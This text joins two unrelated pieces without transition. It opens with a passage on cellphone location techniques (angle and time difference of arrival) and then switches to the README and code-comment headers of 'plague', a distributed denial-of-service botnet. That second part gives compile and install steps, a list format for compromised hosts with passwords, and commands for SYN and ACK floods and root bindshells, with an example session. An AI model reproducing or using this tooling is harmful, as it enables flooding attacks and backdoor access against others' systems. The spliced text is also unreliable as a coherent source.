antenna arrays that shape the cell site transmitter and receiver 
signals into a beam that focuses on the mobile unit and ignores 
other signals. Although potentially expensive, these antennae 
could improve call quality.


[.Snip.]

Measuring Time Difference Of Arrival

Time difference of arrival is another well known technique used 
for determining the locations of mobile devices. Time 
difference of arrival has been used since radar systems were 
first invented over 50 years ago and is used with GPS technology 
today. It is well suited to estimating location of all wireless 
devices because it works with both brief transmissions, such as 
the reverse control channel, and with longer transmissions, such 
as the reverse voice channel. These systems work on the basis of 
a highly precise timing of a mobile units signal as the 
transmission is received at various cell sites. From the precise 
timing, appropriate triangulation can be performed to estimate 
position, as well as speed and direction of travel. In contrast 
to angle of arrival systems, the distance from the transmitter 
to any cell site is not a factor in accurate timing, and 
therefore does not degrade accuracy. Also, in contrast to both 
measured power and angle of arrival systems, time difference of 
arrival systems do not require that the signal be received at any 
appreciable power level (i.e. relative to the background noise 
level in the wireless band).

For many applications, time difference of arrival offers many 
positive benefits. The system requires no modifications to 
existing mobile devices, regardless of modulation protocol. Thus 
all of the existing 22 million8 analog cellular telephones could 
be supported. As with other locating techniques, time difference 
of arrival systems typically require the addition of new equipment 
at cell sites though existing antennae can be used in many cases. 
Where existing antennae are not available, simple whip antennae 
(i.e. the type of cellular antennae on most car windows) can be 
used.

Because antenna requirements are simple and unobtrusive, time 
difference of arrival receivers can be put in many locations, 
including areas without cell sites. This might be advantageous if
one wanted to improve location estimates in a particular area and 
a regular cell site was not required or desired. This simpler 
configuration has the added benefit of lower implementation cost 
compared to angle of arrival systems.

Though time difference of arrival systems are also affected by the 
same multipath reflections that impair angle of arrival systems, 
they are affected to a lesser degree because of the superior 
timing resolution and frequency resolution characteristics of the 
technique. It is generally considered easier to measure time 
precisely than to measure angle precisely.

The lower implementation cost of time difference of arrival systems 
permits receiver installation at more cell sites, which leads to 
a statistical averaging of the multipath reflections,9 especially 
required in urban environments where there is a greater density of 
man-made structures.

Like angle of arrival, time difference of arrival systems are best 
suited for applications requiring the location information at a 
central site. Unmodified mobile devices are currently not capable 
of displaying position, but the central site can forward the 
information to a data receiver.

This wide range of available technology choices each offers at least 
one technical fit for each desired application whether it be for an 
E-911 system, Billing by Location, fraud detection and prosecution, 
System Planning and Design or the hundreds of new applications that 
will become available in the next decade.

1.  About 

the primary purpose of this program is to create an environment that it
capable of effectively coordinating a number of compromised hosts in a
distributed attack. The nature of this attack ranges from denial of
service to a sophisticated scan of the Internet for potential targets for
future compromise.

the program will consist of a client which runs on the users own
machine. The client communicates with a master server which will be
responsible for coordinating a set of ghost daemons.

                           |---- GHOST 1
                           |---- GHOST 2
  CLIENT <-> MAINSERVER -->|---- GHOST 3
                           |---- .......
                           |---- GHOST N


(at the time of writing the client is not done so you will have to use
netcat for now , telnet will not do !@)

Feature list

Banner scanner     Scan ports for well known strings              Coming soon
solaris fake args  Allow us to fake argv[0] on solaris            Coming soon


2. Compilation
before you compile change the defines at the top of each source file to suit 
you needs.

To compile on most systems simply type: 

#gcc -o server -O3 server.c 

#gcc -o ghost -O3 ghost.c 

If you are using solaris you will have to type:

#gcc -o server -O3 -lnsl -lsocket -DSOLARIS
#gcc -o ghost  -O3 -lnsl -lsocket -DSOLARIS

3. Installation 

 
to install the ghost

simply type 
#./ghost 
it will auto go into the background and listen on the port that was defined 
in the source file.

Before you can set the server running you weill have to make a file called 
server.list. This file must contain the ip port and password of every box
you install the ghosts on. This file should be put in the same directory
from where you will run the master server. and example server.list would
look like this 

127.0.0.1 567 lamehost
64.123.76.0 775 fearme
155.245.119.254 23 changepass

which consists of IP PORT and PASSWORD respectivly.

to install the server
#./server &lt;port> &
and it will read server.list and fork into the backgound and listen on the 
specified port.
 

4. Running the plague network

to connect to the server you will need to download netcat
get this from www.l0pht.com/~weld/netcat the real client is still being 
worked on so you will have to make do with with netcat for now , telnet
will not work.

connect to the server as follows 

#nc SERVER_IP PORT

here is an example run

[root@triton]#nc 127.0.0.1 1234

Plague by datawar/blazinweed u r 0wn3d
Login: ld.so.1

Excellent!

Try typing help for command list
Idle connection time set correct.

plague>help
quit            -       Closes your connection
help            -       Prints out this shit
stream          -       &lt;port> &lt;ip of target> &lt;time>
syn             -       &lt;port> &lt;ip of target> &lt;time>
bindshell       -       &lt;ip of miniserver> &lt;port>
pingall         -       Checks if ghosts are up

plague>stream 0 127.0.0.1 10


this would make the ghosts attack 127.0.0.1 with random sourced ack packets 
for ten seconds.


plague>syn 0 127.0.0.1 20

this would make the ghosts attack 127.0.0.1 with random sourced syn packets 
for 20 seconds.

plague>bindshell 45.45.45.45 1234

this would make the ghost ip 45.45.45.45 bind a shell to port 1234 you would 
then just telnet to this port and be dropped to a root shell.

plague>pingall 
1.1.1.1    UP
2.2.2.2    UP

this shows that ghosts 1.1.1.1 2.2.2.2 are all up and ready for commands.

If i didn't school you hardcore that day in #darkcyde then why did you go to 
all the trouble of removing rpclist.c and ciscoscan.c from your site :).

ghost.c by blazinweed

/* 
ghost.c coded by blazinweed  Email: blazinweed@stoned.com  

this daemon is part of the plague package written by blazinweed & datawar
plague is a distributed dos/scanning network implemented properly
we wrote this because trinoo/tfn/mstream suck !@#!!@%!$@
this was a quick and dirty hack so if you don't like it don't use it.
I do plan to improve on this code and add alot more features stay tuned.

 
     NOTES 
==============
************************************************************
1. STREAM fixed by blazinweed
************************************************************
I chose stream due to its good interoperability with many os's
I've had it compile on bsd/solaris/linux/digitalunix.
The orginal stream.c , stream2.c and Mstream were fundementaly flawed because
they did not respect the socket_not_ready errno. The consequences
of which would send the cpu to 100% as it tried to send packets down a 
unready raw socket and be flooded with errno. 
the fix to this was relativly simple with only the need for a usleep(0.01)
before the sendto() ; this gave the socket enough time to get ready.
This version of stream is much more deadly so be careful!@.
***********************************************************
3. Syn flooder fixed by blazinweed to flood for a duration
***********************************************************
this was originaly going to be slice.c but it didn't work
to well with solaris so i switched to punk.c
***********************************************************
3.  BIND SHELL 
***********************************************************
its lame but does the job well and binds a shell to a port on
a selected daemon oh and don't forget to 
kill -9 ` ps -ef | grep "/inetd -s /tmp" | awk '{print $2} '`
kill -HUP `ps -ef | grep " /usr/sbin/inetd -s" | awk '{print $2} '`
once your done with your shell as it gives other people access.

***********************************************************
4. INSTALL/RUN module 
**********************************************************
 --still to do

**********************************************************
5. PORT SCAN 
***********************************************************
ls
-- still to do

in order for the fake arg's to work the program name needs to be longer than th
e fake args

/*
  Coded by datawar
  dw@dtmf.org || dw@f41th.com
  http://www.f41th.com


  Features:
  =========

  - timeouts:    Idle timeouts are supported.
  - login:       A trivial passwd verification.
  - pingall:     It will check all the ghosts to see if they are up.
  - sniff:  Enables sniffing of other ppl u r 'sharing' the plague network with
.
  - verbose:     Just logs the connections of ppl connected to the server
  - bindshell:   Will open a shell on the port/ip u define.
  - syn/stream:The main server will take care to communicate with all the ghost
s
                and make sure all of them are streaming/syn flooding the target
.
             A good idea is to stop using the plague network in such a process.

Note:everything is saved to the logfile defined. make sure u edit all ur define
s
       also run as './server port &' to make it background. It forks as the nam
e
       u have defined.


  TODO:
  =====
  
  The next release will include:
  - Encryption
  - Distributed scanning which will split up say an A class to all the ghosts
    hehe it will be nice to scan an A class network in minutes.
    * banner scanning
    * port scanning
    All of them in stealth mode and certain features to make it quick.
  - Hax0ring, it will try possible exploits of ur own in a script file.
  - Heh enough we cant say everything :P
